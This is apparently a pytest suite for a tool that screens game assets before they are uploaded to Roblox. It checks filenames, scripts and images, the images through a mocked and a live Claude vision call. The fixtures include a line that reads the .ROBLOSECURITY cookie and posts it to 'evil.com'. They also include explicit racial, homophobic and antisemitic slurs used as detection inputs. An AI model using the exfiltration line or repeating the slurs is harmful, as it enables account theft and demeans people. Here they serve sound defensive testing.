"""
test_asset_moderator.py -- Tests for pre-upload asset safety screening.

Verifies that the moderator correctly flags content that violates
Roblox Community Standards before assets reach the upload API.
"""

import json
from dataclasses import dataclass, field
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from converter.asset_moderator import (
    ModerationFinding,
    ModerationReport,
    _screen_filename,
    _screen_script,
    _screen_audio_filename,
    _screen_image_content,
    moderate_assets,
    write_report,
)


# ---------------------------------------------------------------------------
# Filename screening
# ---------------------------------------------------------------------------

class TestFilenameScreening:
    """Filenames with slurs, hate speech, or IP terms should be flagged."""

    @pytest.mark.parametrize("name", [
        "character_nigger.png",
        "faggot_sprite.psd",
        "enemy_kike.fbx",
        "retarded_npc.png",
    ])
    def test_slurs_flagged_as_violation(self, name):
        finding = _screen_filename(name, "texture")
        assert finding is not None
        assert finding.classification == "VIOLATION"
        assert "Civility" in finding.standards

    @pytest.mark.parametrize("name", [
        "pokemon_character.png",
        "mario_level.fbx",
        "disney_castle.png",
        "fortnite_skin.psd",
        "minecraft_block.png",
    ])
    def test_ip_terms_flagged_as_warning(self, name):
        finding = _screen_filename(name, "texture")
        assert finding is not None
        assert finding.classification == "WARNING"
        assert "Integrity" in finding.standards

    @pytest.mark.parametrize("name", [
        "warrior.png",
        "tree_bark_diffuse.png",
        "SF_Door.fbx",
        "explosion_particle.png",
        "grass_texture_01.tga",
        "HornetRifle.fbx",
    ])
    def test_normal_names_not_flagged(self, name):
        finding = _screen_filename(name, "texture")
        assert finding is None


# ---------------------------------------------------------------------------
# Script screening
# ---------------------------------------------------------------------------

class TestScriptScreening:
    """Scripts with exfiltration patterns, slurs, or off-platform URLs."""

    def test_roblosecurity_access_flagged(self, tmp_path):
        script = tmp_path / "evil.cs"
        script.write_text('var cookie = ".ROBLOSECURITY"; SendToServer(cookie);')
        findings = _screen_script(script, "evil.cs")
        assert any(f.classification == "WARNING" and "Security" in f.standards
                    for f in findings)

    def test_httpservice_post_flagged(self, tmp_path):
        script = tmp_path / "exfil.cs"
        script.write_text('HttpService:PostAsync("https://evil.com/steal", data)')
        findings = _screen_script(script, "exfil.cs")
        assert any("HttpService POST" in f.evidence for f in findings)

    def test_discord_link_flagged(self, tmp_path):
        script = tmp_path / "promo.cs"
        script.write_text('local link = "discord.gg/myserver"')
        findings = _screen_script(script, "promo.cs")
        assert any("Off-platform" in f.evidence for f in findings)

    def test_telegram_link_flagged(self, tmp_path):
        script = tmp_path / "promo2.cs"
        script.write_text('local link = "t.me/mygroup"')
        findings = _screen_script(script, "promo2.cs")
        assert any("Off-platform" in f.evidence for f in findings)

    def test_password_string_flagged(self, tmp_path):
        script = tmp_path / "auth.cs"
        script.write_text('string password = GetInput();')
        findings = _screen_script(script, "auth.cs")
        assert any("credential" in f.evidence for f in findings)

    def test_slur_in_script_flagged(self, tmp_path):
        script = tmp_path / "bad.cs"
        script.write_text('// kill the niggers')
        findings = _screen_script(script, "bad.cs")
        assert any(f.classification == "VIOLATION" and "Civility" in f.standards
                    for f in findings)

    def test_clean_script_not_flagged(self, tmp_path):
        script = tmp_path / "clean.cs"
        script.write_text("""
using UnityEngine;
public class Player : MonoBehaviour {
    public float speed = 5f;
    void Update() {
        transform.Translate(Vector3.forward * speed * Time.deltaTime);
    }
}
""")
        findings = _screen_script(script, "clean.cs")
        assert len(findings) == 0


# ---------------------------------------------------------------------------
# Audio filename screening
# ---------------------------------------------------------------------------

class TestAudioScreening:
    def test_normal_game_audio_not_flagged(self):
        assert _screen_audio_filename("gunshot.mp3", "Sounds/gunshot.mp3") is None
        assert _screen_audio_filename("explosion.wav", "Sounds/explosion.wav") is None
        assert _screen_audio_filename("footstep_01.ogg", "Sounds/footstep_01.ogg") is None


# ---------------------------------------------------------------------------
# Image content screening (mocked API)
# ---------------------------------------------------------------------------

class TestImageContentScreening:
    """Test that the vision screening correctly parses API responses."""

    def _make_test_image(self, tmp_path, name="test.png"):
        """Create a minimal valid PNG for testing."""
        try:
            from PIL import Image
            img = Image.new("RGBA", (10, 10), (255, 0, 0, 255))
            path = tmp_path / name
            img.save(path)
            return path
        except ImportError:
            pytest.skip("PIL not available")

    def _mock_api_response(self, response_text):
        """Set up mock anthropic client returning given response text."""
        mock_anthropic = MagicMock()
        mock_response = MagicMock()
        mock_response.content = [MagicMock(text=response_text)]
        mock_anthropic.Anthropic.return_value.messages.create.return_value = mock_response
        return mock_anthropic

    def test_violation_detected(self, tmp_path):
        """API response with VIOLATION should produce a finding."""
        img_path = self._make_test_image(tmp_path, "nudity.png")
        mock = self._mock_api_response("1|VIOLATION|Character has exposed nipples")

        with patch("converter.asset_moderator._anthropic", mock), \
             patch("config.ANTHROPIC_API_KEY", "test-key"):
            findings = _screen_image_content([(img_path, "chars/nudity.png")])

        assert len(findings) == 1
        assert findings[0].classification == "VIOLATION"
        assert "nipples" in findings[0].evidence
        assert findings[0].relative_path == "chars/nudity.png"

    def test_smoking_detected(self, tmp_path):
        """Smoking content should be flagged as VIOLATION."""
        img_path = self._make_test_image(tmp_path, "priest.png")
        mock = self._mock_api_response("1|VIOLATION|Character is smoking a cigar")

        with patch("converter.asset_moderator._anthropic", mock), \
             patch("config.ANTHROPIC_API_KEY", "test-key"):
            findings = _screen_image_content([(img_path, "chars/priest.png")])

        assert len(findings) == 1
        assert findings[0].classification == "VIOLATION"
        assert "smoking" in findings[0].evidence.lower()

    def test_alcohol_detected(self, tmp_path):
        """Alcohol content should be flagged."""
        img_path = self._make_test_image(tmp_path, "alcodemon.png")
        mock = self._mock_api_response("1|VIOLATION|Character holding alcohol bottle")

        with patch("converter.asset_moderator._anthropic", mock), \
             patch("config.ANTHROPIC_API_KEY", "test-key"):
            findings = _screen_image_content([(img_path, "chars/alcodemon.png")])

        assert len(findings) == 1
        assert findings[0].classification == "VIOLATION"

    def test_offensive_gesture_detected(self, tmp_path):
        """Offensive gestures (middle finger) should be flagged."""
        img_path = self._make_test_image(tmp_path, "harpy.png")
        mock = self._mock_api_response("1|VIOLATION|Character showing middle finger gesture")

        with patch("converter.asset_moderator._anthropic", mock), \
             patch("config.ANTHROPIC_API_KEY", "test-key"):
            findings = _screen_image_content([(img_path, "chars/harpy.png")])

        assert len(findings) == 1
        assert findings[0].classification == "VIOLATION"

    def test_clean_image_ok(self, tmp_path):
        """Clean images should produce no findings."""
        img_path = self._make_test_image(tmp_path, "tree.png")
        mock = self._mock_api_response("1|OK|Tree texture, appropriate")

        with patch("converter.asset_moderator._anthropic", mock), \
             patch("config.ANTHROPIC_API_KEY", "test-key"):
            findings = _screen_image_content([(img_path, "textures/tree.png")])

        assert len(findings) == 0

    def test_batch_multiple_images(self, tmp_path):
        """Multiple images in a batch — only flagged ones produce findings."""
        imgs = []
        for name in ["good1.png", "bad.png", "good2.png"]:
            imgs.append((self._make_test_image(tmp_path, name), f"sprites/{name}"))

        mock = self._mock_api_response(
            "1|OK|Normal sprite\n"
            "2|VIOLATION|Contains nudity\n"
            "3|OK|Normal sprite"
        )

        with patch("converter.asset_moderator._anthropic", mock), \
             patch("config.ANTHROPIC_API_KEY", "test-key"):
            findings = _screen_image_content(imgs)

        assert len(findings) == 1
        assert findings[0].relative_path == "sprites/bad.png"
        assert findings[0].classification == "VIOLATION"

    def test_no_api_key_skips_gracefully(self, tmp_path):
        """Without API key, image screening should return empty list."""
        img_path = self._make_test_image(tmp_path)
        with patch("config.ANTHROPIC_API_KEY", ""):
            findings = _screen_image_content([(img_path, "test.png")])
        assert findings == []

    def test_no_anthropic_package_skips_gracefully(self, tmp_path):
        """Without anthropic package, image screening should return empty list."""
        img_path = self._make_test_image(tmp_path)
        with patch("converter.asset_moderator._anthropic", None), \
             patch("config.ANTHROPIC_API_KEY", "test-key"):
            findings = _screen_image_content([(img_path, "test.png")])
        assert findings == []

    def test_api_error_handled_gracefully(self, tmp_path):
        """API errors should not crash, just return empty findings."""
        img_path = self._make_test_image(tmp_path)
        mock_anthropic = MagicMock()
        mock_anthropic.Anthropic.return_value.messages.create.side_effect = Exception("API error")

        with patch("converter.asset_moderator._anthropic", mock_anthropic), \
             patch("config.ANTHROPIC_API_KEY", "test-key"):
            findings = _screen_image_content([(img_path, "test.png")])

        assert findings == []


# ---------------------------------------------------------------------------
# Integration: moderate_assets with auto-blocklist
# ---------------------------------------------------------------------------

class TestModerateAssetsIntegration:
    """Full moderate_assets flow with blocklist behavior."""

    @dataclass
    class FakeAsset:
        path: Path
        relative_path: Path
        kind: str
        guid: str = ""
        size_bytes: int = 0
        hash: str = ""

    @dataclass
    class FakeManifest:
        project_root: Path = Path(".")
        assets: list = field(default_factory=list)
        by_kind: dict = field(default_factory=dict)

    def test_violations_counted(self):
        manifest = self.FakeManifest(assets=[
            self.FakeAsset(
                path=Path("/fake/nigger_sprite.png"),
                relative_path=Path("Assets/nigger_sprite.png"),
                kind="texture",
            ),
        ])
        with patch("converter.asset_moderator._screen_image_content", return_value=[]):
            report = moderate_assets(manifest, "test_project")
        assert report.violations > 0

    def test_clean_project_all_ok(self):
        manifest = self.FakeManifest(assets=[
            self.FakeAsset(
                path=Path("/fake/tree_bark.png"),
                relative_path=Path("Assets/tree_bark.png"),
                kind="texture",
            ),
            self.FakeAsset(
                path=Path("/fake/stone_wall.fbx"),
                relative_path=Path("Assets/stone_wall.fbx"),
                kind="mesh",
            ),
        ])
        # Patch out image screening (no API key needed for filename-only test)
        with patch("converter.asset_moderator._screen_image_content", return_value=[]):
            report = moderate_assets(manifest, "test_project")
        assert report.violations == 0
        assert report.warnings == 0

    def test_report_json_structure(self, tmp_path):
        report = ModerationReport(project="test")
        report.add(ModerationFinding(
            relative_path="chars/bad.png",
            kind="texture",
            classification="VIOLATION",
            standards=["Safety"],
            evidence="Contains nudity",
            source_document="#1",
        ))
        report.add(ModerationFinding(
            relative_path="textures/ok.png",
            kind="texture",
            classification="OK",
            standards=[], evidence="", source_document="",
        ))

        path = write_report(report, tmp_path)
        data = json.loads(path.read_text())

        assert data["project"] == "test"
        assert data["counts"]["violation"] == 1
        assert data["counts"]["ok"] == 1
        assert len(data["findings"]) == 1  # Only non-OK findings
        assert data["findings"][0]["classification"] == "VIOLATION"
        assert data["findings"][0]["relative_path"] == "chars/bad.png"


# ---------------------------------------------------------------------------
# Real image screening against swipe-royale assets (slow, requires API key)
# ---------------------------------------------------------------------------

@pytest.mark.slow
class TestRealImageScreening:
    """Screen actual swipe-royale character sprites through Claude vision.

    These tests call the real Anthropic API and verify that known-bad
    images are correctly flagged. Only run with -m slow flag.
    """

    CHARS_DIR = Path(__file__).parent.parent.parent / "test_projects" / "swipe-royale" / "Assets" / "resources" / "sprites" / "characters"

    def _convert_psd(self, name: str) -> Path:
        """Convert a PSD to PNG for API submission."""
        from PIL import Image
        psd_path = self.CHARS_DIR / name
        if not psd_path.exists():
            pytest.skip(f"{name} not found")
        png_path = Path(f"/tmp/test_screen_{psd_path.stem}.png")
        Image.open(psd_path).convert("RGBA").save(png_path)
        return png_path

    def test_llamataur_flagged_for_nudity(self):
        """llamataur.psd has exposed nipples — must be VIOLATION."""
        import config
        if not config.ANTHROPIC_API_KEY:
            pytest.skip("No ANTHROPIC_API_KEY")
        png = self._convert_psd("llamataur.psd")
        findings = _screen_image_content([(png, "characters/llamataur.psd")])
        assert len(findings) >= 1
        assert any(f.classification == "VIOLATION" for f in findings), \
            f"llamataur.psd should be VIOLATION but got: {findings}"

    def test_priest1_flagged_for_smoking(self):
        """priest1.psd shows character smoking — must be VIOLATION."""
        import config
        if not config.ANTHROPIC_API_KEY:
            pytest.skip("No ANTHROPIC_API_KEY")
        png = self._convert_psd("priest1.psd")
        findings = _screen_image_content([(png, "characters/priest1.psd")])
        assert len(findings) >= 1
        assert any(f.classification == "VIOLATION" for f in findings), \
            f"priest1.psd should be VIOLATION but got: {findings}"

    def test_alcodemon_flagged_for_alcohol(self):
        """alcodemon.psd shows character with alcohol bottle — must be flagged."""
        import config
        if not config.ANTHROPIC_API_KEY:
            pytest.skip("No ANTHROPIC_API_KEY")
        png = self._convert_psd("alcodemon.psd")
        findings = _screen_image_content([(png, "characters/alcodemon.psd")])
        assert len(findings) >= 1
        assert any(f.classification in ("VIOLATION", "WARNING") for f in findings), \
            f"alcodemon.psd should be flagged but got: {findings}"

    def test_harpy_flagged_for_gesture(self):
        """harpy.psd shows middle finger — must be flagged."""
        import config
        if not config.ANTHROPIC_API_KEY:
            pytest.skip("No ANTHROPIC_API_KEY")
        png = self._convert_psd("harpy.psd")
        findings = _screen_image_content([(png, "characters/harpy.psd")])
        assert len(findings) >= 1
        assert any(f.classification in ("VIOLATION", "WARNING") for f in findings), \
            f"harpy.psd should be flagged but got: {findings}"

    def test_huntress_clean(self):
        """huntress.psd is a normal fantasy character — should be OK."""
        import config
        if not config.ANTHROPIC_API_KEY:
            pytest.skip("No ANTHROPIC_API_KEY")
        png = self._convert_psd("huntress.psd")
        findings = _screen_image_content([(png, "characters/huntress.psd")])
        assert len(findings) == 0 or all(f.classification == "OK" for f in findings), \
            f"huntress.psd should be OK but got: {findings}"

    def test_warrior_clean(self):
        """warrior.psd is a normal fantasy character — should be OK."""
        import config
        if not config.ANTHROPIC_API_KEY:
            pytest.skip("No ANTHROPIC_API_KEY")
        png = self._convert_psd("warrior.psd")
        findings = _screen_image_content([(png, "characters/warrior.psd")])
        assert len(findings) == 0 or all(f.classification == "OK" for f in findings), \
            f"warrior.psd should be OK but got: {findings}"
